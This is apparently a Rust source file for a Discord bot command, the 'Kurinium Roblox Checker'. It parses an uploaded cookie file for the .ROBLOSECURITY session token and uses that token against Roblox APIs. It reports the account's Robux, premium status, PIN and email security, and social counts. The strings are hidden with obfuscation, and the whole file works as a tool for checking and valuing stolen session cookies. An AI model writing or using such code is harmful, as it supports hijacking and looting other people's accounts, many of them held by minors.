use crate::commands::Arguments;
use crate::commands::BotCommand;
use anyhow::Result;
use async_trait::async_trait;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use twilight_http::Client as HttpClient;
use twilight_model::channel::message::embed::EmbedField;
use twilight_model::channel::message::Message;
use twilight_util::builder::embed::{EmbedBuilder, EmbedFooterBuilder, ImageSource};

pub struct RobloxCommand;

#[derive(Debug, Deserialize)]
struct AuthenticatedUser {
    id: u64,
    name: String,
    #[serde(rename = "displayName")]
    display_name: String,
}

#[derive(Debug, Deserialize)]
struct UserInfo {
    description: Option<String>,
    created: String,
    #[serde(rename = "isBanned")]
    is_banned: bool,
    #[serde(rename = "hasVerifiedBadge")]
    has_verified_badge: Option<bool>,
}

#[derive(Debug, Deserialize)]
struct CurrencyResponse {
    robux: u64,
}

#[derive(Debug, Deserialize)]
struct CountResponse {
    count: u64,
}

#[derive(Debug, Deserialize)]
struct PremiumResponse {
    #[serde(rename = "membershipType")]
    membership_type: Option<String>,
}

#[derive(Debug, Deserialize)]
struct ThumbnailData {
    #[serde(rename = "imageUrl")]
    image_url: Option<String>,
}

#[derive(Debug, Deserialize)]
struct ThumbnailResponse {
    data: Vec<ThumbnailData>,
}

#[derive(Debug, Deserialize)]
struct SettingsResponse {
    #[serde(rename = "isAccountPinEnabled")]
    is_pin_enabled: Option<bool>,
    #[serde(rename = "isAccountRestrictionsEnabled")]
    is_restrictions_enabled: Option<bool>,
}

#[derive(Debug, Deserialize)]
struct EmailResponse {
    #[serde(rename = "emailAddress")]
    email_address: Option<String>,
    verified: Option<bool>,
}

#[derive(Debug, Deserialize)]
struct JsonCookie {
    name: String,
    value: String,
    domain: Option<String>,
}

#[derive(Debug, Serialize)]
struct RobloxAccountInfo {
    user_id: u64,
    username: String,
    display_name: String,
    robux: u64,
    premium: bool,
    friends_count: u64,
    followers_count: u64,
    following_count: u64,
    account_age_days: i64,
    created_date: String,
    is_banned: bool,
    has_verified_badge: bool,
    pin_enabled: bool,
    email_verified: bool,
    avatar_url: Option<String>,
    description: String,
}

#[async_trait]
impl BotCommand for RobloxCommand {
    fn name(&self) -> &str { "roblox" }
    fn description(&self) -> &str { "Check Roblox account info from cookie file" }
    fn category(&self) -> &str { "utility" }
    fn usage(&self) -> &str { ".roblox (attach cookie file)" }
    fn examples(&self) -> &'static [&'static str] { 
        &[
            ".roblox (with attached cookies.json)",
            ".roblox (with attached cookies.txt)",
        ] 
    }
    fn aliases(&self) -> &'static [&'static str] { &["rbx", "rblx"] }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        _args: Arguments,
    ) -> Result<()> {
        if msg.attachments.is_empty() {
            self.show_help(http, msg).await?;
            return Ok(());
        }

        let attachment = &msg.attachments[0];
        http.create_message(msg.channel_id)
            .content("Getting cookie file...")
            .await?;

        let cookie_content = match reqwest::get(&attachment.url).await {
            Ok(resp) => match resp.text().await {
                Ok(text) => text,
                Err(e) => {
                    http.create_message(msg.channel_id)
                        .content(&format!("Failed to read file: {}", e))
                        .await?;
                    return Ok(());
                }
            },
            Err(e) => {
                http.create_message(msg.channel_id)
                    .content(&format!("Failed to download file: {}", e))
                    .await?;
                return Ok(());
            }
        };

        let roblosecurity = match self.extract_roblosecurity(&cookie_content, &attachment.filename) {
            Some(cookie) => cookie,
            None => {
                http.create_message(msg.channel_id)
                    .content(&format!("Could not find `{}` cookie in the file\n\nSupported formats:\n• JSON (from browser extension)\n• Netscape (cookies.txt)", obfstr::obfstr!(".ROBLOSECURITY")))
                    .await?;
                return Ok(());
            }
        };

        http.create_message(msg.channel_id)
            .content("Processing...")
            .await?;

        match self.fetch_account_info(&roblosecurity).await {
            Ok(info) => {
                self.send_account_embed(http, msg, &info).await?;
            }
            Err(e) => {
                http.create_message(msg.channel_id)
                    .content(&format!("Failed to fetch account info: {}\n\n*Cookie might be invalid or expired*", e))
                    .await?;
            }
        }

        Ok(())
    }
}

impl RobloxCommand {
    async fn show_help(&self, http: &Arc<HttpClient>, msg: &Message) -> Result<()> {
        let embed = EmbedBuilder::new()
            .title("Kurinium : Roblox Account")
            .description("Check Roblox account information from cookie file")
            .field(EmbedField {
                name: "Usage".to_string(),
                value: "`.roblox` **with** `attached cookie file`".to_string(),
                inline: false,
            })
            .field(EmbedField {
                name: "Supported Formats".to_string(),
                value: "• `JSON` and `Netscape`".to_string(),
                inline: false,
            })
            .footer(EmbedFooterBuilder::new("Attach a cookie file to check account"))
            .build();

        http.create_message(msg.channel_id).embeds(&[embed]).await?;
        Ok(())
    }

    fn extract_roblosecurity(&self, content: &str, filename: &str) -> Option<String> {
        let content = content.trim();
        if content.starts_with('[') || content.starts_with('{') {
            return self.parse_json_cookies(content);
        }
        
        if content.contains(obfstr::obfstr!(".roblox.com")) || filename.ends_with(".txt") {
            return self.parse_netscape_cookies(content);
        }
        
        if let Some(cookie) = self.parse_json_cookies(content) {
            return Some(cookie);
        }
        
        self.parse_netscape_cookies(content)
    }

    fn parse_json_cookies(&self, content: &str) -> Option<String> {
        if let Ok(cookies) = serde_json::from_str::<Vec<JsonCookie>>(content) {
            for cookie in cookies {
                if cookie.name == obfstr::obfstr!(".ROBLOSECURITY") {
                    return Some(cookie.value);
                }
            }
        }
        
        if let Ok(cookie) = serde_json::from_str::<JsonCookie>(content) {
            if cookie.name == obfstr::obfstr!(".ROBLOSECURITY") {
                return Some(cookie.value);
            }
        }
        
        if content.contains(obfstr::obfstr!(".ROBLOSECURITY")) {
            if let Some(start) = content.find(obfstr::obfstr!("_|WARNING:-DO-NOT-SHARE-THIS")) {
                let remaining = &content[start..];
                if let Some(end) = remaining.find('"') {
                    return Some(remaining[..end].to_string());
                }
                let value: String = remaining
                    .chars()
                    .take_while(|c| !matches!(c, '"' | '\'' | '\n' | '\r' | ',' | '}'))
                    .collect();
                if !value.is_empty() {
                    return Some(value);
                }
            }
        }
        
        None
    }

    fn parse_netscape_cookies(&self, content: &str) -> Option<String> {
        for line in content.lines() {
            let line = line.trim();
            
            if line.is_empty() || line.starts_with('#') {
                continue;
            }
            
            let parts: Vec<&str> = line.split('\t').collect();
            
            if parts.len() >= 7 {
                let name = parts[5];
                let value = parts[6];
                
                if name == obfstr::obfstr!(".ROBLOSECURITY") {
                    return Some(value.to_string());
                }
            }
            
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 7 {
                let name = parts[5];
                let value = parts[6];
                
                if name == obfstr::obfstr!(".ROBLOSECURITY") {
                    return Some(value.to_string());
                }
            }
        }
        
        None
    }

    async fn fetch_account_info(&self, cookie: &str) -> Result<RobloxAccountInfo> {
        let client = Client::builder()
            .cookie_store(true)
            .build()?;

        let cookie_header = format!("{}={}", obfstr::obfstr!(".ROBLOSECURITY"), cookie);
        let auth_user: AuthenticatedUser = client
            .get(obfstr::obfstr!("https://users.roblox.com/v1/users/authenticated"))
            .header("Cookie", &cookie_header)
            .send()
            .await?
            .json()
            .await?;

        let user_id = auth_user.id;

        let user_info: UserInfo = client
            .get(&format!("{}{}" , obfstr::obfstr!("https://users.roblox.com/v1/users/"), user_id))
            .header("Cookie", &cookie_header)
            .send()
            .await?
            .json()
            .await?;

        let currency: CurrencyResponse = client
            .get(obfstr::obfstr!("https://economy.roblox.com/v1/user/currency"))
            .header("Cookie", &cookie_header)
            .send()
            .await?
            .json()
            .await
            .unwrap_or(CurrencyResponse { robux: 0 });

        let friends: CountResponse = client
            .get(obfstr::obfstr!("https://friends.roblox.com/v1/my/friends/count"))
            .header("Cookie", &cookie_header)
            .send()
            .await?
            .json()
            .await
            .unwrap_or(CountResponse { count: 0 });

        let followers: CountResponse = client
            .get(obfstr::obfstr!("https://friends.roblox.com/v1/my/followers/count"))
            .header("Cookie", &cookie_header)
            .send()
            .await?
            .json()
            .await
            .unwrap_or(CountResponse { count: 0 });

        let following: CountResponse = client
            .get(obfstr::obfstr!("https://friends.roblox.com/v1/my/followings/count"))
            .header("Cookie", &cookie_header)
            .send()
            .await?
            .json()
            .await
            .unwrap_or(CountResponse { count: 0 });

        let premium_resp = client
            .get(&format!("{}{}{}" , obfstr::obfstr!("https://premiumfeatures.roblox.com/v1/users/"), user_id, obfstr::obfstr!("/validate-membership")))
            .header("Cookie", &cookie_header)
            .send()
            .await;
        
        let is_premium = premium_resp
            .map(|r| r.status().is_success())
            .unwrap_or(false);

        let thumbnail: Option<String> = match client
            .get(&format!("{}{}{}" , obfstr::obfstr!("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="), user_id, obfstr::obfstr!("&size=420x420&format=Png&isCircular=false")))
            .send()
            .await
        {
            Ok(resp) => {
                match resp.json::<ThumbnailResponse>().await {
                    Ok(t) => t.data.first().and_then(|d| d.image_url.clone()),
                    Err(_) => None,
                }
            }
            Err(_) => None,
        };

        let pin_enabled = match client
            .get(obfstr::obfstr!("https://apis.roblox.com/account-pin/v1/status"))
            .header("Cookie", &cookie_header)
            .send()
            .await
        {
            Ok(resp) => {
                match resp.json::<SettingsResponse>().await {
                    Ok(s) => s.is_pin_enabled.unwrap_or(false),
                    Err(_) => false,
                }
            }
            Err(_) => false,
        };

        let email_verified = match client
            .get(obfstr::obfstr!("https://accountsettings.roblox.com/v1/email"))
            .header("Cookie", &cookie_header)
            .send()
            .await
        {
            Ok(resp) => {
                match resp.json::<EmailResponse>().await {
                    Ok(e) => e.verified.unwrap_or(false),
                    Err(_) => false,
                }
            }
            Err(_) => false,
        };

        let created_date = &user_info.created;
        let account_age_days = self.calculate_account_age(created_date);

        Ok(RobloxAccountInfo {
            user_id,
            username: auth_user.name,
            display_name: auth_user.display_name,
            robux: currency.robux,
            premium: is_premium,
            friends_count: friends.count,
            followers_count: followers.count,
            following_count: following.count,
            account_age_days,
            created_date: self.format_date(created_date),
            is_banned: user_info.is_banned,
            has_verified_badge: user_info.has_verified_badge.unwrap_or(false),
            pin_enabled,
            email_verified,
            avatar_url: thumbnail,
            description: user_info.description.unwrap_or_default(),
        })
    }

    fn calculate_account_age(&self, created: &str) -> i64 {
        if let Ok(created_time) = chrono::DateTime::parse_from_rfc3339(created) {
            let now = chrono::Utc::now();
            let duration = now.signed_duration_since(created_time);
            return duration.num_days();
        }
        0
    }

    fn format_date(&self, date_str: &str) -> String {
        if let Ok(dt) = chrono::DateTime::parse_from_rfc3339(date_str) {
            dt.format("%B %d, %Y").to_string()
        } else {
            date_str.to_string()
        }
    }

    async fn send_account_embed(&self, http: &Arc<HttpClient>, msg: &Message, info: &RobloxAccountInfo) -> Result<()> {
        let premium_status = if info.premium { "Premium" } else { "No Premium" };
        let ban_status = if info.is_banned { "BANNED" } else { "Not Banned" };
        let verified_badge = if info.has_verified_badge { " ✓" } else { "" };
        let pin_status = if info.pin_enabled { "Enabled" } else { "Disabled" };
        let email_status = if info.email_verified { "Verified" } else { "Not Verified" };

        let robux_formatted = format_number(info.robux);

        let mut embed = EmbedBuilder::new()
            .title(format!("{}{}", info.display_name, verified_badge))
            .description(format!(
                "**Username:** `{}`\n**User ID:** `{}`",
                info.username, info.user_id
            ))
            .color(0xE2231A) // Roblox red
            .field(EmbedField {
                name: "Robux".to_string(),
                value: format!("**R$ {}**", robux_formatted),
                inline: true,
            })
            .field(EmbedField {
                name: "Premium".to_string(),
                value: premium_status.to_string(),
                inline: true,
            })
            .field(EmbedField {
                name: "Status".to_string(),
                value: ban_status.to_string(),
                inline: true,
            })
            .field(EmbedField {
                name: "Friends".to_string(),
                value: format_number(info.friends_count),
                inline: true,
            })
            .field(EmbedField {
                name: "Followers".to_string(),
                value: format_number(info.followers_count),
                inline: true,
            })
            .field(EmbedField {
                name: "Following".to_string(),
                value: format_number(info.following_count),
                inline: true,
            })
            .field(EmbedField {
                name: "Account Age".to_string(),
                value: format!("{} days", format_number(info.account_age_days as u64)),
                inline: true,
            })
            .field(EmbedField {
                name: "Created".to_string(),
                value: info.created_date.clone(),
                inline: true,
            })
            .field(EmbedField {
                name: "Security".to_string(),
                value: format!("PIN: {}\nEmail: {}", pin_status, email_status),
                inline: true,
            });

        if let Some(avatar_url) = &info.avatar_url {
            if let Ok(image) = ImageSource::url(avatar_url) {
                embed = embed.thumbnail(image);
            }
        }

        if !info.description.is_empty() {
            let desc = if info.description.len() > 200 {
                format!("{}...", &info.description[..200])
            } else { info.description.clone() };
            embed = embed.field(EmbedField {
                name: "Bio".to_string(),
                value: format!("```{}```", desc),
                inline: false,
            });
        }

        embed = embed.field(EmbedField {
            name: "Profile".to_string(),
            value: format!("[View on Roblox]({}{}{})", obfstr::obfstr!("https://www.roblox.com/users/"), info.user_id, obfstr::obfstr!("/profile")),
            inline: false,
        });

        let embed = embed
            .footer(EmbedFooterBuilder::new("Kurinium Roblox Checker"))
            .build();

        http.create_message(msg.channel_id).embeds(&[embed]).await?;
        Ok(())
    }
}

fn format_number(n: u64) -> String {
    let s = n.to_string();
    let mut result = String::new();
    for (i, c) in s.chars().rev().enumerate() {
        if i > 0 && i % 3 == 0 {
            result.push(',');
        }
        result.push(c);
    }
    result.chars().rev().collect()
}